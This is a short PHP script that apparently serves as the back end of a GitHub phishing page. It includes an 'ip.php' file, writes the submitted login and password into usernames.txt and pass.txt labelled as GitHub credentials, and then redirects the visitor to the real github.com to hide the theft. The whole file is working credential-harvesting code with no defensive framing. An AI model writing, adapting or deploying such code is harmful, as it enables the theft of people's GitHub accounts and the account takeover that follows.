<?php
include 'ip.php';
file_put_contents("usernames.txt", "Github Username : " . $email = $_POST['login'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Github Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://github.com/');
?>
